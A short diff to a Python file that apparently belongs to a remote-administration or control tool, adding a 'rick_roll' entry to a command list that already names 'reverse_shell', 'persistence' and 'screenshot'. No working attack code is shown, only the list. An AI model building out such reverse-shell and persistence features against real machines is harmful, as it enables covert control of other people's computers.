@@ -5,7 +5,7 @@ import time
 
 BUFFER_SIZE = 4096
 SEPARATOR = "<SEPARATOR>"
-COMMANDS = ["ipconfig", "whoami", "reverse_shell", "screenshot", "persistence", "send_message", "exit"]
+COMMANDS = ["ipconfig", "whoami", "reverse_shell", "screenshot", "persistence", "send_message", "rick_roll", "exit"]
 USERNAME = os.getlogin() #Gets the PC User.
 
 #List Clients
